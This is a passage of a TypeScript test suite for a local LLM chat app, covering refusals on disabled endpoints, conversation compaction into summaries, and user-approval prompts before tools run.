    for (const titleModel of ['lm-studio/qwen/qwen3-8b', 'off/tiny-title']) {
      updateSettings({ titleModel })
      chat = reply('Hi')
      start(`title me without ${titleModel}`)
      expect((await titleOf(`title me without ${titleModel}`)).model).toBe('llama3.2')
    }
  })
})

describe('a model whose endpoint is gone or turned off', () => {
  afterEach(() => {
    setEndpoints(getSettings().endpoints.filter((e) => e.id !== 'off'))
    invalidateProviders()
  })

  /** A chat with one finished exchange on ollama/llama3.2, and an endpoint 'off' that's turned off. */
  async function chatBesideOffEndpoint(content: string): Promise<string> {
    chat = reply('an answer')
    const r = start(content)
    await doneEvent(r.conversation.id)
    setEndpoints([
      ...getSettings().endpoints,
      { id: 'off', name: 'Off box', kind: 'ollama', flavor: 'ollama', baseUrl: 'http://10.0.0.9:11434', enabled: false }
    ])
    invalidateProviders()
    return r.conversation.id
  }

  const snapshot = async (conversationId: string) => {
    const { listMessages } = await import('../src/main/db/conversations')
    return listMessages(conversationId).map((m) => ({ id: m.id, content: m.content }))
  }

  /** `act` is refused with `error`, and the chat's messages and model are as they were, with no chat request made. */
  async function refusedUnchanged(conversationId: string, act: () => unknown, error: string | typeof EndpointGoneError) {
    const before = await snapshot(conversationId)
    const model = getConversation(conversationId)?.model
    // A request from an earlier test can land late, so only the count this call could change is compared.
    const calls = chatCalls.length
    await expect((async () => act())()).rejects.toThrow(error)
    await new Promise((r) => setTimeout(r, 50))
    expect(await snapshot(conversationId)).toEqual(before)
    expect(getConversation(conversationId)?.model).toBe(model)
    expect(chatCalls.length).toBe(calls)
  }

  it('refuses a Retry and keeps the answer it would replace', async () => {
    const id = await chatBesideOffEndpoint('retry me on a turned-off endpoint')
    await refusedUnchanged(id, () => service.regenerate(id, { model: 'off/qwen3:8b', think: null }), 'Off box is turned off')
  })

  it('refuses an Edit and keeps everything after the message', async () => {
    const id = await chatBesideOffEndpoint('edit me on a turned-off endpoint')
    const firstUser = (await snapshot(id))[0]
    await refusedUnchanged(id, () => service.edit(firstUser.id, 'changed', { model: 'off/qwen3:8b', think: null }), 'Off box is turned off')
  })

  it('refuses a send, adding no message', async () => {
    const id = await chatBesideOffEndpoint('send after me on a turned-off endpoint')
    await refusedUnchanged(id, () => service.send({ ...sendBody(id), content: 'Continue', model: 'off/qwen3:8b' }), 'Off box is turned off')
  })

  it('refuses a Retry on a removed endpoint', async () => {
    const id = await chatBesideOffEndpoint('retry me on a removed endpoint')
    await refusedUnchanged(id, () => service.regenerate(id, { model: 'gone-box/qwen3:8b', think: null }), EndpointGoneError)
  })
})

describe('/compact', () => {
  it('summarizes every message with the chat’s model and replays the summary instead of them', async () => {
    chat = reply('an answer')
    const r = start('first question')
    await doneEvent(r.conversation.id)
    for (const q of ['second', 'third', 'fourth', 'fifth', 'sixth']) {
      await waitFor(() => !service.isReplying())
      events.length = 0
      const next = service.send({ ...sendBody(r.conversation.id), content: q })
      await doneEvent(next.conversation.id)
    }
    await waitFor(() => !service.isReplying())
    // Twelve messages. The summary request is the one non-streaming call that isn't a title.
    const base = ollama.handler
    ollama.handler = (req, res) => {
      const body = req.json as { stream?: boolean; messages?: Array<{ content: string }> }
      if (req.url === '/api/chat' && body.stream === false && /compact/i.test(String(body.messages?.[0]?.content))) {
        compactCalls.push(req.json)
        return res.writeHead(200).end(
          JSON.stringify({
            message: { role: 'assistant', content: 'Six questions were asked and answered.' },
            done: true,
            prompt_eval_count: 50,
            eval_count: 8
          })
        )
      }
      return base!(req, res)
    }
    const compactCalls: Array<Record<string, unknown>> = []
    try {
      const c = await service.compact(r.conversation.id, { focus: 'keep the numbers', model: 'ollama/llama3.2' })
      expect(compactCalls).toHaveLength(1)
      const [instructions, summaryRequest] = (compactCalls[0].messages as Array<{ content: string }>).map((m) => m.content)
      expect(instructions).toContain('keep the numbers')
      expect(summaryRequest).toContain('first question')
      // Every message was summarized, the last turns too.
      const { listMessages } = await import('../src/main/db/conversations')
      const messages = listMessages(r.conversation.id)
      expect(c.compaction).toMatchObject({ summary: 'Six questions were asked and answered.', messages: 12, upTo: messages[11].createdAt })
      expect(summaryRequest).toContain('sixth')
      // The next reply replays the summary and only what followed.
      chatCalls = []
      events.length = 0
      await waitFor(() => !service.isReplying())
      const after = service.send({ ...sendBody(r.conversation.id), content: 'seventh' })
      await doneEvent(after.conversation.id)
      const sent = chatCalls[0].messages as Array<{ role: string; content: string }>
      expect(sent[0].content).toContain('<earlier_conversation messages="12">')
      expect(sent[0].content).toContain('Six questions were asked and answered.')
      expect(sent.slice(1).map((m) => m.content)).toEqual(['seventh'])
    } finally {
      ollama.handler = base
    }
  })

  /** A mock that answers every summary request from `answers` in turn, capturing each request. */
  const summarizer = (answers: string[], calls: Array<Record<string, unknown>>, gate?: Promise<void>) => {
    const base = ollama.handler
    ollama.handler = async (req, res) => {
      const body = req.json as { stream?: boolean; messages?: Array<{ content: string }> }
      if (req.url === '/api/chat' && body.stream === false && /compact/i.test(String(body.messages?.[0]?.content))) {
        calls.push(req.json)
        if (gate) await gate
        const content = answers[Math.min(calls.length, answers.length) - 1]
        return res
          .writeHead(200)
          .end(JSON.stringify({ message: { role: 'assistant', content }, done: true, prompt_eval_count: 50, eval_count: 8 }))
      }
      return base!(req, res)
    }
    return () => (ollama.handler = base)
  }

  const exchanges = async (conversationId: string, questions: string[]) => {
    for (const q of questions) {
      await waitFor(() => !service.isReplying())
      events.length = 0
      const next = service.send({ ...sendBody(conversationId), content: q })
      await doneEvent(next.conversation.id)
    }
    await waitFor(() => !service.isReplying())
  }

  it('summarizes through the chat model’s provider, sending the body it always sent', async () => {
    chat = reply('an answer')
    const r = start('a question')
    await doneEvent(r.conversation.id)
    await waitFor(() => !service.isReplying())
    const calls: Array<Record<string, unknown>> = []
    const restore = summarizer(['Short.'], calls)
    const once = vi.spyOn(resolve('llama3.2').provider, 'chatOnce')
    try {
      await service.compact(r.conversation.id, { focus: '', model: 'ollama/llama3.2' })
      expect(once).toHaveBeenCalledWith(
        expect.objectContaining({
          messages: [expect.objectContaining({ role: 'system' }), expect.objectContaining({ role: 'user' })],
          think: null,
          contextWindow: 8192,
          temperature: 0.3
        }),
        { timeoutMs: 300_000 }
      )
      expect(Object.keys(calls[0])).toEqual(['model', 'messages', 'options', 'stream'])
      expect(JSON.stringify(calls[0].options)).toBe('{"temperature":0.3,"num_ctx":8192}')
      const trace = listTraces(r.conversation.id).find((t) => t.kind === 'compact')!
      expect(getTrace(trace.id)).toMatchObject({ dialect: 'ollama', auth: null, endpointId: 'ollama', endpointName: 'Ollama' })
    } finally {
      once.mockRestore()
      restore()
    }
  })

  it('summarizes in pieces when the older messages outgrow the model’s window, folding each summary into the next', async () => {
    // The mock model's window is 8192 tokens (~32k characters): seven 6,000-character messages won't fit at once.
    const long = 'word '.repeat(1200)
    chat = reply(long)
    const r = start(`first ${long}`)
    await doneEvent(r.conversation.id)
    await exchanges(r.conversation.id, ['second', 'third', 'fourth', 'fifth', 'sixth'])
    const calls: Array<Record<string, unknown>> = []
    const restore = summarizer(['Summary one.', 'Summary two.', 'Summary three.'], calls)
    try {
      const c = await service.compact(r.conversation.id, { focus: '', model: 'ollama/llama3.2' })
      expect(calls.length).toBeGreaterThan(1)
      const users = calls.map((call) => String((call.messages as Array<{ content: string }>)[1].content))
      expect(users[0]).toContain('first')
      expect(users[1]).toContain('Summary one.')
      expect(users.every((u) => /summarize/i.test(u.slice(-200)))).toBe(true)
      expect(c.compaction?.summary).toBe(calls.length === 2 ? 'Summary two.' : 'Summary three.')
      expect(c.compaction?.messages).toBe(12)
    } finally {
      restore()
    }
  })

  it('marks the compaction later than a reply’s usage row even when the clock hasn’t ticked', async () => {
    chat = reply('an answer')
    const r = start('q1')
    await doneEvent(r.conversation.id)
    // Freeze the clock: every timestamp from here on comes from now()'s monotonic counter, not Date.now(), the
    // same as several rows landing within one real millisecond on a fast machine.
    const frozen = vi.spyOn(Date, 'now').mockReturnValue(Date.now())
    try {
      await exchanges(r.conversation.id, ['q2'])
      const restore = summarizer(['Two questions.'], [])
      try {
        await service.compact(r.conversation.id, { focus: '', model: 'ollama/llama3.2' })
        // The meter reads null right after compacting; it doesn't still count the pre-compaction reply.
        expect(conversationUsage(r.conversation.id, getSettings().endpoints).lastContextTokens).toBeNull()
      } finally {
        restore()
      }
    } finally {
      frozen.mockRestore()
    }
  })

  it('summarizes every message but a failed reply that saved nothing', async () => {
    chat = reply('an answer')
    const r = start('q1')
    await doneEvent(r.conversation.id)
    await exchanges(r.conversation.id, ['q2'])
    // A failed reply saves with no content and is left out of the count.
    chat = (_b, res) => void res.writeHead(500).end('boom')
    await exchanges(r.conversation.id, ['q3'])
    chat = reply('an answer')
    await exchanges(r.conversation.id, ['q4'])
    // Filtered: q1 A1 q2 A2 q3 q4 A4, and all of them are summarized.
    const calls: Array<Record<string, unknown>> = []
    const restore = summarizer(['Four questions.'], calls)
    try {
      const c = await service.compact(r.conversation.id, { focus: '', model: 'ollama/llama3.2' })
      const { listMessages } = await import('../src/main/db/conversations')
      const messages = listMessages(r.conversation.id)
      expect(c.compaction).toMatchObject({ messages: 7, upTo: messages[7].createdAt })
      const transcript = String((calls[0].messages as Array<{ content: string }>)[1].content)
      expect(transcript).toContain('q1')
      expect(transcript).toContain('q2')
      expect(transcript).toContain('q4')
    } finally {
      restore()
    }
  })

  it('compacts again by folding the earlier summary in, and clears the summary when a covered message is edited', async () => {
    chat = reply('an answer')
    const r = start('q1')
    await doneEvent(r.conversation.id)
    await exchanges(r.conversation.id, ['q2', 'q3', 'q4', 'q5', 'q6'])
    const calls: Array<Record<string, unknown>> = []
    const restore = summarizer(['First summary.', 'Second summary.'], calls)
    try {
      const first = await service.compact(r.conversation.id, { focus: '', model: 'ollama/llama3.2' })
      expect(first.compaction?.messages).toBe(12)
      await exchanges(r.conversation.id, ['q7', 'q8'])
      const second = await service.compact(r.conversation.id, { focus: '', model: 'ollama/llama3.2' })
      expect(second.compaction).toMatchObject({ summary: 'Second summary.', messages: 16 })
      expect(String((calls[1].messages as Array<{ content: string }>)[1].content)).toContain('First summary.')
      // Editing q1, which the summary covers, clears it: the summary stood for the old text.
      const { listMessages } = await import('../src/main/db/conversations')
      const q1 = listMessages(r.conversation.id)[0]
      events.length = 0
      const edited = await service.edit(q1.id, 'q1 reworded', { model: 'ollama/llama3.2', think: null })
      await doneEvent(edited.conversation.id)
      expect(edited.conversation.compaction).toBeNull()
    } finally {
      restore()
    }
  })

  /** Every summary request's transcript, in order. */
  const transcripts = (calls: Array<Record<string, unknown>>) =>
    calls.map((call) => String((call.messages as Array<{ content: string }>)[1].content)).join('\n')

  it('summarizes the last exchange too, however many tool calls it made, and replays only the summary', async () => {
    chat = reply('an answer')
    const r = start('q1 look around')
    await doneEvent(r.conversation.id)
    await exchanges(r.conversation.id, ['q2 find stock data', 'q3 carry on'])
    // The last reply is a whole agentic run, as in a code session, with more calls than a message lists.
    const { listMessages } = await import('../src/main/db/conversations')
    updateMessage(listMessages(r.conversation.id).at(-1)!.id, {
      toolEvents: Array.from({ length: 130 }, (_, i) => ({
        tool: 'run_command',
        args: { command: `cargo test step_${i + 1}` },
        ok: true,
        summary: `step ${i + 1} passed`
      }))
    })
    const calls: Array<Record<string, unknown>> = []
    const restore = summarizer(['Three tasks, all done.'], calls)
    try {
      const c = await service.compact(r.conversation.id, { focus: '', model: 'ollama/llama3.2' })
      const transcript = transcripts(calls)
      for (const q of ['q1 look around', 'q2 find stock data', 'q3 carry on']) expect(transcript).toContain(`User: ${q}`)
      // It lists its first 40 calls and its last 80, and says how many it left out between them.
      expect(transcript).toContain(
        '→ step 40 passed]\n[… 10 more tool calls]\n[run_command(command: "cargo test step_51") → step 51 passed]'
      )
      expect(transcript).toContain('[run_command(command: "cargo test step_130") → step 130 passed]')
      const messages = listMessages(r.conversation.id)
      expect(c.compaction).toMatchObject({ summary: 'Three tasks, all done.', messages: 6, upTo: messages.at(-1)!.createdAt })
      // The next reply sends the summary and nothing from before it.
      chatCalls = []
      events.length = 0
      const after = service.send({ ...sendBody(r.conversation.id), content: 'q4' })
      await doneEvent(after.conversation.id)
      const sent = chatCalls[0].messages as Array<{ role: string; content: string }>
      expect(sent[0].content).toContain('<earlier_conversation messages="6">')
      expect(sent[0].content).toContain('Three tasks, all done.')
      expect(sent.slice(1).map((m) => m.content)).toEqual(['q4'])
    } finally {
      restore()
    }
  })

  it('keeps every tool call of a long reply and the end of its prose, cutting the middle with a mark', async () => {
    const prose = `${'OPENING'.padEnd(15_000 - ' THE CONCLUSION.'.length, ' filler')} THE CONCLUSION.`
    chat = reply(prose)
    const r = start('research x.io')
    await doneEvent(r.conversation.id)
    chat = reply('an answer')
    await exchanges(r.conversation.id, ['q2', 'q3'])
    const { listMessages } = await import('../src/main/db/conversations')
    const long = listMessages(r.conversation.id)[1]
    expect(long.content).toHaveLength(15_000)
    updateMessage(long.id, {
      toolEvents: Array.from({ length: 30 }, (_, i) => ({
        tool: 'web_fetch',
        args: { url: `https://x.io/${i + 1}` },
        ok: true,
        summary: `Page ${i + 1}`
      }))
    })
    const calls: Array<Record<string, unknown>> = []
    const restore = summarizer(['Researched x.io.'], calls)
    try {
      await service.compact(r.conversation.id, { focus: '', model: 'ollama/llama3.2' })
      const transcript = transcripts(calls)
      const lines = transcript.split('\n')
      for (let i = 1; i <= 30; i++) expect(lines).toContain(`[web_fetch(url: "https://x.io/${i}") → Page ${i}]`)
      expect(transcript).toContain('Assistant: OPENING filler')
      expect(transcript).toContain('[… 9000 characters cut …]')
      expect(transcript).toContain('THE CONCLUSION.')
    } finally {
      restore()
    }
  })

  it('gives the summarizer a reply that only called tools, as its tool calls', async () => {
    chat = reply('an answer')
    const r = start('q1')
    await doneEvent(r.conversation.id)
    await waitFor(() => !service.isReplying())
    // Stopped during its one call, the reply saves no prose: the call is all there is of it.
    setApiKey('test-key')
    chat = (_b, res) => void res.writeHead(200).end(toolCall('web_fetch', { url: 'https://tools.io/only' }))
    web = () => undefined // web_fetch never answers
    events.length = 0
    const stopped = service.send({ ...sendBody(r.conversation.id), content: 'q2 read tools.io' })
    await waitFor(() => events.some((e) => e.type === 'tool' && e.event.pending))
    await service.stop(r.conversation.id)
    expect(getMessage(stopped.assistantMessageId)).toMatchObject({
      content: '',
      toolEvents: [expect.objectContaining({ tool: 'web_fetch' })]
    })
    chat = reply('an answer')
    await exchanges(r.conversation.id, ['q3', 'q4'])
    const calls: Array<Record<string, unknown>> = []
    const restore = summarizer(['Four questions.'], calls)
    try {
      const c = await service.compact(r.conversation.id, { focus: '', model: 'ollama/llama3.2' })
      expect(transcripts(calls)).toMatch(/User: q2 read tools\.io\n\nAssistant:\n\[web_fetch\(url: "https:\/\/tools\.io\/only"\)/)
      expect(c.compaction?.messages).toBe(8)
    } finally {
      restore()
    }
  })

  it('refuses to compact again with nothing new since the last summary', async () => {
    chat = reply('an answer')
    const r = start('q1')
    await doneEvent(r.conversation.id)
    await exchanges(r.conversation.id, ['q2', 'q3'])
    const restore = summarizer(['A summary.'], [])
    try {
      await service.compact(r.conversation.id, { focus: '', model: 'ollama/llama3.2' })
      await expect(service.compact(r.conversation.id, { focus: '', model: 'ollama/llama3.2' })).rejects.toThrow(
        'Nothing new to compact since the last summary.'
      )
    } finally {
      restore()
    }
  })

  it('refuses a reply or a second compaction while one runs', async () => {
    chat = reply('an answer')
    const r = start('q1')
    await doneEvent(r.conversation.id)
    await exchanges(r.conversation.id, ['q2', 'q3', 'q4'])
    let release!: () => void
    const gate = new Promise<void>((res) => (release = res))
    const calls: Array<Record<string, unknown>> = []
    const restore = summarizer(['Late summary.'], calls, gate)
    try {
      const running = service.compact(r.conversation.id, { focus: '', model: 'ollama/llama3.2' })
      await waitFor(() => calls.length === 1)
      expect(() => service.send({ ...sendBody(r.conversation.id), content: 'q5' })).toThrow(/compacting/i)
      await expect(service.compact(r.conversation.id, { focus: '', model: 'ollama/llama3.2' })).rejects.toThrow(/compacting/i)
      release()
      await expect(running).resolves.toMatchObject({ compaction: { summary: 'Late summary.' } })
    } finally {
      restore()
    }
  })

  it('gives up cleanly when the chat is deleted while it compacts', async () => {
    chat = reply('an answer')
    const r = start('q1')
    await doneEvent(r.conversation.id)
    await exchanges(r.conversation.id, ['q2', 'q3', 'q4'])
    let release!: () => void
    const gate = new Promise<void>((res) => (release = res))
    const calls: Array<Record<string, unknown>> = []
    const restore = summarizer(['Too late.'], calls, gate)
    try {
      const running = service.compact(r.conversation.id, { focus: '', model: 'ollama/llama3.2' })
      await waitFor(() => calls.length === 1)
      deleteConversation(r.conversation.id)
      release()
      await expect(running).rejects.toThrow(/deleted|gone/i)
    } finally {
      restore()
    }
  })

  it('refuses a summary the model left empty', async () => {
    chat = reply('an answer')
    const r = start('q1')
    await doneEvent(r.conversation.id)
    await exchanges(r.conversation.id, ['q2', 'q3', 'q4'])
    const restore = summarizer(['<think>hmm</think>   '], [])
    try {
      await expect(service.compact(r.conversation.id, { focus: '', model: 'ollama/llama3.2' })).rejects.toThrow(/no summary/i)
    } finally {
      restore()
    }
  })

  it('refuses a chat with nothing in it yet', async () => {
    const empty = createConversation({ projectId: null, model: 'ollama/llama3.2', think: null, skills: [], toolSources: [] })
    await expect(service.compact(empty.id, { focus: '', model: 'ollama/llama3.2' })).rejects.toThrow('Nothing to compact yet.')
  })

  it('when the last reply failed, upTo is the user message it never answered', async () => {
    chat = reply('an answer')
    const r = start('q1')
    await doneEvent(r.conversation.id)
    // The last exchange's reply fails and saves no content, so the filter that drops it also drops it from `since`.
    chat = (_b, res) => void res.writeHead(500).end('boom')
    await exchanges(r.conversation.id, ['q2'])
    const calls: Array<Record<string, unknown>> = []
    const restore = summarizer(['One question answered.'], calls)
    try {
      const c = await service.compact(r.conversation.id, { focus: '', model: 'ollama/llama3.2' })
      const { listMessages } = await import('../src/main/db/conversations')
      const q2 = listMessages(r.conversation.id).find((m) => m.content === 'q2')!
      expect(c.compaction).toMatchObject({ messages: 3, upTo: q2.createdAt })
    } finally {
      restore()
    }
  })

  it('cuts a single tool call’s line at the 300-character cap', async () => {
    chat = reply('ok')
    const r = start('q1')
    await doneEvent(r.conversation.id)
    const { listMessages } = await import('../src/main/db/conversations')
    const a1 = listMessages(r.conversation.id)[1]
    updateMessage(a1.id, { toolEvents: [{ tool: 'run_command', args: { command: 'x' }, ok: true, summary: 'y'.repeat(400) }] })
    const calls: Array<Record<string, unknown>> = []
    const restore = summarizer(['Summary.'], calls)
    try {
      await service.compact(r.conversation.id, { focus: '', model: 'ollama/llama3.2' })
      const callLine = transcripts(calls)
        .split('\n')
        .find((l) => l.startsWith('[run_command'))!
      expect(callLine).toHaveLength(300)
      expect(callLine.endsWith('…')).toBe(true)
    } finally {
      restore()
    }
  })

  // #129: a code session's message names what its @ references sent, as it names its attachments.
  it('names a message’s @ references in the transcript, and which weren’t sent', async () => {
    chat = reply('ok')
    const r = start('What do @src/a.ts and @x.png do?')
    await doneEvent(r.conversation.id)
    const { setMessageReferences } = await import('../src/main/db/conversations')
    setMessageReferences(r.userMessage!.id, [
      { tokens: ['src/a.ts'], path: 'src/a.ts', kind: 'file', lines: { from: 1, to: 1, total: 1 }, text: '     1\tone' },
      { tokens: ['x.png'], path: 'x.png', kind: 'file', refused: 'binary file', text: 'x.png is a binary file.' }
    ])
    const calls: Array<Record<string, unknown>> = []
    const restore = summarizer(['Summary.'], calls)
    try {
      await service.compact(r.conversation.id, { focus: '', model: 'ollama/llama3.2' })
      expect(transcripts(calls)).toContain(
        'User: What do @src/a.ts and @x.png do? [referenced: src/a.ts] [referenced: x.png (not sent: binary file)]'
      )
    } finally {
      restore()
    }
  })

  it('cuts the middle of a single reply too big for the whole piece, keeping its first and last tool calls', async () => {
    chat = reply('a short reply')
    const r = start('research many pages')
    await doneEvent(r.conversation.id)
    const { listMessages } = await import('../src/main/db/conversations')
    const a1 = listMessages(r.conversation.id)[1]
    updateMessage(a1.id, {
      toolEvents: Array.from({ length: 120 }, (_, i) => ({
        tool: 'web_fetch',
        args: { url: `https://x.io/page-${i + 1}` },
        ok: true,
        summary: `Fetched page ${i + 1} of the crawl. ${'x'.repeat(150)}`
      }))
    })
    // A model name never fetched before, so its info isn't the 8192-token one other tests already cached for
    // llama3.2: a small window pins this well below the ~27,000-character line the 120 calls add up to.
    const base = ollama.handler
    ollama.handler = (req, res) => {
      if (req.url === '/api/show' && req.json.model === 'tiny-window')
        return res
          .writeHead(200)
          .end(JSON.stringify({ capabilities: ['completion', 'tools'], model_info: { 'llama.context_length': 2048 } }))
      return base!(req, res)
    }
    const calls: Array<Record<string, unknown>> = []
    const restore = summarizer(['Summary.'], calls)
    try {
      await service.compact(r.conversation.id, { focus: '', model: 'ollama/tiny-window' })
      const transcript = transcripts(calls)
      expect(transcript).toMatch(/\[… \d+ characters cut to fit …\]/)
      expect(transcript).toContain('https://x.io/page-1"')
      expect(transcript).toContain('https://x.io/page-120"')
    } finally {
      restore()
      ollama.handler = base
    }
  })
})

describe('asking before a tool runs', () => {
  // A tool that acts on this Mac: it asks first, and records each run.
  const runs: Array<Record<string, unknown>> = []
  let unregister: () => void
  beforeAll(() => {
    unregister = registerToolProvider({
      id: 'notes',
      tools: () => [
        { type: 'function', function: { name: 'notes__delete', description: 'Delete a note', parameters: { type: 'object' } } }
      ],
      pending: ({ name, args }) => ({ tool: name, args, ok: true, pending: true, summary: `note ${String(args.id)}` }),
      run: async ({ name, args }) => {
        runs.push(args)
        return { content: `Deleted note ${String(args.id)}.`, event: { tool: name, args, ok: true, summary: `note ${String(args.id)}` } }
      },
      approval: () => 'ask'
    })
  })
  let unregisterArchive: (() => void) | null = null
  afterAll(() => unregister())
  beforeEach(() => {
    runs.length = 0
  })
  afterEach(() => {
    unregisterArchive?.()
    unregisterArchive = null
  })

  const deleteThenAnswer: ChatHandler = (b, res, n) =>
    n === 1 ? void res.writeHead(200).end(toolCall('notes__delete', { id: 7 })) : reply('Done.')(b, res, n)
  const toolEvents = (conversationId: string) =>
    events.filter((e): e is Extract<ChatEvent, { type: 'tool' }> => e.type === 'tool' && e.conversationId === conversationId)
  const waiting = (conversationId: string) => waitFor(() => toolEvents(conversationId).find((e) => e.event.awaiting))
  const toolMessages = (call: Record<string, unknown>) =>
    (call.messages as Array<{ role: string; content: string }>).filter((m) => m.role === 'tool').map((m) => m.content)

  it('waits for an answer, saving the waiting call at once, and runs it on Allow once', async () => {
    chat = deleteThenAnswer
    const r = start('delete note 7')
    const ask = await waiting(r.conversation.id)
    await new Promise((resolve) => setTimeout(resolve, 50))
    expect(runs).toHaveLength(0)
    expect(chatCalls).toHaveLength(1)
    // Saved straight away (not on the next throttled checkpoint), so a crash keeps the question.
    expect(getMessage(r.assistantMessageId)!.toolEvents[0]).toMatchObject({ tool: 'notes__delete', awaiting: true })
    expect(approvals.waitingCount()).toBe(1)

    approvals.decide(r.conversation.id, ask.messageId, ask.index, 'once')
    const done = await doneEvent(r.conversation.id)
    expect(runs).toEqual([{ id: 7 }])
    expect(toolMessages(chatCalls[1])).toEqual(['Deleted note 7.'])
    expect(done.message.toolEvents[0]).toMatchObject({ tool: 'notes__delete', ok: true })
    expect(done.message.toolEvents[0].awaiting).toBeUndefined()
    expect(approvals.waitingCount()).toBe(0)
    // Once only: the chat didn't start allowing it.
    expect(getConversation(r.conversation.id)!.allowedTools).toEqual([])
  })

  it("tells the model a denied call didn't run, and doesn't ask again in the same reply", async () => {
    // The model tries again after the denial; the second call is declined without asking.
    chat = (b, res, n) =>
      n <= 2 ? void res.writeHead(200).end(toolCall('notes__delete', { id: n })) : reply('I could not delete it.')(b, res, n)
    const r = start('delete note 1')
    const ask = await waiting(r.conversation.id)
    approvals.decide(r.conversation.id, ask.messageId, ask.index, 'deny')
    const done = await doneEvent(r.conversation.id)
    expect(runs).toHaveLength(0)
    expect(toolMessages(chatCalls[1])[0]).toMatch(/The user declined to run notes__delete, so it didn't run/)
    expect(toolEvents(r.conversation.id).filter((e) => e.event.awaiting)).toHaveLength(1)
    expect(done.message.toolEvents.map((e) => [e.ok, e.declined])).toEqual([
      [false, true],
      [false, true]
    ])
    const trace = listTraces(r.conversation.id).find((t) => t.kind === 'tool')
    expect(trace?.summary).toBe('notes__delete: declined by you')
  })

  it('remembers Allow for this chat, so later calls in the chat run without asking', async () => {
    chat = deleteThenAnswer
    const r = start('delete note 7')
    const ask = await waiting(r.conversation.id)
    approvals.decide(r.conversation.id, ask.messageId, ask.index, 'chat')
    await doneEvent(r.conversation.id)
    expect(getConversation(r.conversation.id)!.allowedTools).toEqual(['notes__delete'])

    events.length = 0
    chatCalls = []
    service.send({
      conversationId: r.conversation.id,
      projectId: null,
      content: 'and again',
      attachmentIds: [],
      model: 'ollama/llama3.2',
      think: null,
      skills: [],
      toolSources: []
    })
    await doneEvent(r.conversation.id)
    expect(runs).toHaveLength(2)
    expect(toolEvents(r.conversation.id).some((e) => e.event.awaiting)).toBe(false)
  })

  it('never runs a call that was waiting when the reply was stopped', async () => {
    chat = deleteThenAnswer
    const r = start('delete note 7')
    const ask = await waiting(r.conversation.id)
    await service.stop(r.conversation.id)
    const saved = getMessage(r.assistantMessageId)!
    expect(runs).toHaveLength(0)
    expect(saved.error).toBeNull()
    expect(saved.toolEvents[0]).toMatchObject({ ok: false, pending: false, summary: 'note 7 (not run)' })
    expect(saved.toolEvents[0].awaiting).toBeUndefined()
    expect(approvals.waitingCount()).toBe(0)
    // Too late to answer now.
    expect(() => approvals.decide(r.conversation.id, ask.messageId, ask.index, 'once')).toThrow(/isn't waiting/)
    expect(listTraces(r.conversation.id).every((t) => t.status !== 'running')).toBe(true)
  })

  it('lets a chat be deleted while a call waits for an answer', async () => {
    chat = deleteThenAnswer
    const r = start('delete note 7')
    await waiting(r.conversation.id)
    await service.stopAll((id) => id === r.conversation.id) // as deleting a chat or project does
    deleteConversation(r.conversation.id)
    expect(service.isReplying()).toBe(false)
    expect(runs).toHaveLength(0)
  })

  it('reads what the chat allows at each call, so a reset mid-reply holds and a later answer does not undo it', async () => {
    // notes__delete was allowed for the chat. The model first calls notes__archive (which asks); while that waits, the
    // user picks "Ask again before each tool". Allowing notes__archive for the chat must not bring notes__delete back,
    // and the model's next notes__delete must ask.
    unregisterArchive = registerToolProvider({
      id: 'archive',
      tools: () => [
        { type: 'function', function: { name: 'notes__archive', description: 'Archive a note', parameters: { type: 'object' } } }
      ],
      pending: ({ name, args }) => ({ tool: name, args, ok: true, pending: true, summary: `note ${String(args.id)}` }),
      run: async ({ name, args }) => ({ content: 'Archived.', event: { tool: name, args, ok: true, summary: 'archived' } })
    })
    chat = (b, res, n) =>
      n === 1
        ? void res.writeHead(200).end(toolCall('notes__archive', { id: 1 }))
        : n === 2
          ? void res.writeHead(200).end(toolCall('notes__delete', { id: 2 }))
          : reply('Done.')(b, res, n)
    const r = start('tidy up')
    updateConversation(r.conversation.id, { allowedTools: ['notes__delete'] })
    const first = await waiting(r.conversation.id)
    expect(first.event.tool).toBe('notes__archive')
    updateConversation(r.conversation.id, { allowedTools: [] }) // "Ask again before each tool"
    approvals.decide(r.conversation.id, first.messageId, first.index, 'chat')

    const second = await waitFor(() => toolEvents(r.conversation.id).find((e) => e.event.awaiting && e.event.tool === 'notes__delete'))
    expect(runs).toHaveLength(0)
    expect(getConversation(r.conversation.id)!.allowedTools).toEqual(['notes__archive'])
    approvals.decide(r.conversation.id, second.messageId, second.index, 'deny')
    await doneEvent(r.conversation.id)
    expect(runs).toHaveLength(0)
  })

  it('asks for a tool whose provider does not say, and never runs it unasked', async () => {
    unregisterArchive = registerToolProvider({
      id: 'archive',
      tools: () => [
        { type: 'function', function: { name: 'notes__archive', description: 'Archive a note', parameters: { type: 'object' } } }
      ],
      pending: ({ name, args }) => ({ tool: name, args, ok: true, pending: true, summary: 'archive' }),
      run: async () => {
        throw new Error('ran without asking')
      }
    })
    chat = (b, res, n) => (n === 1 ? void res.writeHead(200).end(toolCall('notes__archive', {})) : reply('Done.')(b, res, n))
    const r = start('archive it')
    const ask = await waiting(r.conversation.id)
    approvals.decide(r.conversation.id, ask.messageId, ask.index, 'deny')
    const done = await doneEvent(r.conversation.id)
    expect(done.message.toolEvents[0]).toMatchObject({ tool: 'notes__archive', declined: true })
  })

  it('only takes one of the three answers, for the chat the call is in', async () => {
    chat = deleteThenAnswer
    const r = start('delete note 7')
    const ask = await waiting(r.conversation.id)
    expect(() => approvals.decide(r.conversation.id, ask.messageId, ask.index, 'yes' as never)).toThrow(/Unknown answer/)
    expect(() => approvals.decide('another-chat', ask.messageId, ask.index, 'once')).toThrow(/isn't waiting/)
    expect(runs).toHaveLength(0)
    approvals.decide(r.conversation.id, ask.messageId, ask.index, 'deny')
    await doneEvent(r.conversation.id)
  })
})

describe('asking the user a question', () => {
  const ASK = { questions: [{ question: 'Which format?', header: 'Format', options: [{ label: 'CSV' }, { label: 'JSON' }] }] }
  const askThenAnswer: ChatHandler = (b, res, n) =>
    n === 1 ? void res.writeHead(200).end(toolCall('ask_user', ASK)) : reply('Going with JSON.')(b, res, n)
  const waiting = (conversationId: string) =>
    waitFor(() =>
      events.find(
        (e): e is Extract<ChatEvent, { type: 'tool' }> => e.type === 'tool' && e.conversationId === conversationId && !!e.event.awaiting
      )
    )

  it('saves the waiting question at once, and carries the answer to the model and to later turns', async () => {
    chat = askThenAnswer
    const r = start('convert my data')
    const ask = await waiting(r.conversation.id)
    expect(chatCalls).toHaveLength(1)
    expect(getMessage(r.assistantMessageId)!.toolEvents[0]).toMatchObject({
      tool: 'ask_user',
      awaiting: true,
      ask: { questions: [{ header: 'Format' }] }
    })
    expect(approvals.waitingCount()).toBe(1)
    // Approving is not answering.
